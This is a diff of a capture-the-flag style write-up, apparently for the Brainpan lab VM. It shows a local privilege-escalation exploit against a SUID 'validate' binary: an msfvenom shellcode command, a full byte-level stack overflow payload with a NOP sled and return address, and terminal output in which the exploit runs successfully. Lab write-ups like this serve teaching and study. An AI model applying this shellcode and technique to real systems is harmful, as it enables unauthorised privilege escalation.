@@ -202,9 +202,38 @@ validating input...failed: 46
 This means that '`\x46` is a bad character. 
 
 ## Generate our Paylod
-Since this is a local prviliege escalation exploit, no reverse shell is needed. This means that we can use the payload, `/linux/x86/exec`. Any command that we get executed will run as the `root` user because of the SUID permissions. Let's use MSFVenom to create this shell code for us,
+Since this is a local prviliege escalation exploit, no reverse shell is needed. This means that we can use the payload, `/linux/x86/exec`. Any command that we get executed will run as the `anansi` user because of the SUID permissions.
+```
+-rwsr-xr-x 1 anansi anansi 8.6K Mar  4  2013 validate
+```
+Let's use MSFVenom to create this shell code for us,
 ```
 /infosec/exploitation/metasploit-framework/msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x00\x09\x0a\x10\x46' -f py
 ```
 ## Create Exploit Code
-Now, we are ready to create our local privilege escalation exploit code for the vulnerable `validate` application.
+Now, we are ready to create our local privilege escalation exploit code for the vulnerable `validate` application. First, let's put the whole process into perspective. 
+* To exploit the application, we exploit the fact that the programmer does not handle our input properly by checking it's length or using secure string copy functions available in C. 
+* Our input crashes the application because it overwrite the stack pointer, EIP.
+* Our input also overwrite the EAX register. 
+* We point the EIP to EAX and it will execute any shell code available in EAX.
+* The code bytes are reversed in memory using **Little Endian.**
+* We need to have the follwing in EAX in this sepcific order,
+  1. The address of `call %eax` - `0x80484af` (found in above step)
+  2. A NOP sled to our shell code
+  3. Our shell code (which just does '/bin/sh')
+Again, the new payload to our applcation to exploit the vulnerability will now be, (shell code)+(NOP sled (fill bytes to keep initial 200 byte length))+(Address of `call %eax` Assembly instruction). We already know all of this information, so let's just look at the payload now,
+```
+$(python -c "print '\xdb\xc1\xd9\x74\x24\xf4\xb8\x33\xc8\xf9\xcc\x5b\x33\xc9\xb1\x0b\x31\x43\x1a\x03\x43\x1a\x83\xc3\x04\xe2\xc6\xa2\xf2\x94\xb1\x61\x63\x4d\xec\xe6\xe2\x6a\x86\xc7\x87\x1c\x56\x70\x47\xbf\x3f\xee\x1e\xdc\xed\x06\x28\x23\x11\xd7\x06\x41\x78\xb9\x77\xf6\x12\x45\xdf\xab\x6b\xa4\x12\xcb' + '\x90' * 46 + '\xaf\x84\x04\x08'")
+```
+## Test the Exploit
+Let's finally send this paylod to the binary on the compromised Target system.
+```
+puck@brainpan:/usr/local/bin$ id
+uid=1002(puck) gid=1002(puck) groups=1002(puck)
+puck@brainpan:/usr/local/bin$ ./validate $(python -c "print '\xdb\xc1\xd9\x74\x24\xf4\xb8\x33\xc8\xf9\xcc\x5b\x33\xc9\xb1\x0b\x31\x43\x1a\x03\x43\x1a\x83\xc3\x04\xe2\xc6\xa2\xf2\x94\xb1\x61\x63\x4d\xec\xe6\xe2\x6a\x86\xc7\x87\x1c\x56\x70\x47\xbf\x3f\xee\x1e\xdc\xed\x06\x28\x23\x11\xd7\x06\x41\x78\xb9\x77\xf6\x12\x45\xdf\xab\x6b\xa4\x12\xcb' + '\x90' * 46 + '\xaf\x84\x04\x08'")        
+$ id
+id
+uid=1002(puck) gid=1002(puck) euid=1001(anansi) groups=1001(anansi),1002(puck)
+$ 
+```
+Success.
